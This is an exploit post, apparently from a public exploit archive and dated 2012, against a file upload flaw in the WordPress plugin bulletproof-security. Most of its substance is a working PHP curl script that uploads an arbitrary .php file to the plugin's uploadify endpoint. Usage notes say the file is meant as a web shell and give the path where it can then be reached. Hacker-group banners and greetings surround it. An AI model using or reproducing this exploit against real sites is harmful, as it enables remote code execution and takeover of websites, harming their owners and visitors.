+----------------------------------------------------------------------+
# Exploit Title: Wordpress plugins bulletproof-security file upload vulnerability
# Date: 05/08/2012
# Exploit Author: Tunisian spl01t3r
# Software Link: wordpress.org/extend/plugins/bulletproof-security/
# Version: all
# FB profile: www.facebook.com/TN.spl0it3r
+----------------------------------------------------------------------+
	 ____ (_) ____   ___
	(  _ \| |(  _ \ / _ \
	| | | | || | | x |_|
	| ||_/|_|| ||_/ \___/
	|_|      |_|
	 _ 
	(_)  ____   ____  ____     _____ 
	| | /  __| /  __| \__ \   /  `  \ 
	| | \___ \ \___ \  / _ \_ | Y Y  \
	|_| |____/ |____/ (_____/ |_|_|__/
+----------------------------------------------------------------------+

[+] Exploit code :
<?php

$uploadfile="Tunisia.php";
$ch = curl_init("www.[server]/[path]/wp-content/plugins/bulletproof-security/admin/uploadify/uploadify.php");
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS,
array('Filedata'=>"@$uploadfile",
'folder'=>'/[path]/wp-content/plugins/bulletproof-security/admin/uploadify/'));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$postResult = curl_exec($ch);
curl_close($ch);

print "$postResult";
?>

[+] how TO use
.php must be the devil file 3:)
!!!shell!!!
TN> http://[SERVER]/[path]/wp-content/plugins/bulletproof-security/admin/uploadify/
Filename : $postResult output



+----------------------------------------------------------------------+
[+] greetz to : BIbou sfaxien ; mech lazem ; tn_scorpion ; anas laaribi ;
       jendoubi ahmed ; s-man ; chaouki mkachakh & ;) --Geni ryodan-- ;)
	      daly azrail ; med.bradai<3 ; Firas Arfaoui  ; mohamed bel ;
	          hassen ben mbarek ; prince bibou ; ghazy info ; 
		        Safoine sassi ; DR.hsm ; 7rouz ; THE 077 ;
					  & all tn_spl01t3r's freinds
	                         mAhna mAhna 
	 

+----------------------------------------------------------------------+